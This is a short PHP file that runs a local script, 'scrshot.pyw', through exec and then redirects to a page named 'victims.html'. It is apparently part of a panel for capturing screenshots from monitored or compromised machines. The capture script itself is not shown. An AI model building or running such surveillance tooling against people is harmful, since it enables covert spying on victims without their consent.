<?php
// Executes, returns only last line of the output
echo exec("start scrshot.pyw");
?>
<meta http-equiv="Refresh" content="0; url='../victims.html'" />
